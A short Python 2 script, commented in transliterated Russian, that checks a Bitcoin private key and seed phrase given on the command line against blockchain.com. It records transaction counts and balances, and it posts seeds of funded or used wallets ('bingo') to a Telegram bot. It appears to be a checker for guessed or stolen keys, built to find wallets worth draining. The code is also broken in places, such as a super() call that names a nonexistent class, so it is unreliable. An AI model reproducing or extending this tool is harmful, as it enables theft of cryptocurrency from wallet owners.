from pybitcoin import BitcoinPrivateKey
from BeautifulSoup import BeautifulSoup
import requests, re, json, sys, codecs

class BTCOREINFORMER(object):
	'''sozdal objekt koshelka'''
	def __init__(self, key):
		super(BTCORENOT, self).__init__()
		self.key = key
		self.private = BitcoinPrivateKey(self.key)
		self.public = self.private.public_key()
		self.address = "https://www.blockchain.com/ru/btc/address/"+self.public.address()
		self.walletinfo = BeautifulSoup(requests.get(self.address).text)
		self.data = {}
	'''proveril chto koshelek rabotal'''
	def getTransactions(self):
		return int(self.walletinfo.find('td', id="n_transactions").string)
	'''poluchil balance koshelka'''
	def getBalance(self):
		return int((self.walletinfo.find('td', id="final_balance").span.string).replace("BTC", ""))
	'''vernul vsu huinu'''
	def getInfo(self):
		self.data['address'] = self.address
		return self.data
	'''otpravka gooda'''
	def sendMsg(self):
		return requests.post('https://api.telegram.org/bot{0}/sendMessage?chat_id={1}&text={2}'.format('TELEGRAM:BOTTOKEN', 'USERID', self.data))

btc = BTCOREINFORMER(sys.argv[1])
trans = btc.getTransactions()
balace = btc.getBalance()
info = btc.getInfo()

if trans != 0:
	if balace != 0:
		info['resoult'] = 'bingo'
		info['transactions'] = trans
		info['balace'] = balace
		info['seed'] = sys.argv[2].decode('utf8')
		with open('goodbalance.txt', 'a') as goodbalance:
			goodbalance.write(json.dumps(info))
		btc.sendMsg()
	else:
		info['resoult'] = 'wait'
		info['transactions'] = trans
		info['balace'] = balace
		info['seed'] = sys.argv[2].decode('utf8')
		with open('goodtrance.txt', 'a') as goodtrance:
			goodtrance.write(json.dumps(info))
		btc.sendMsg()
else:
	info['resoult'] = 'false'
	info['seed'] = sys.argv[2].decode('utf8')
	with open('nulltrance.txt', 'a') as nulltrance:
		nulltrance.write(json.dumps(info))
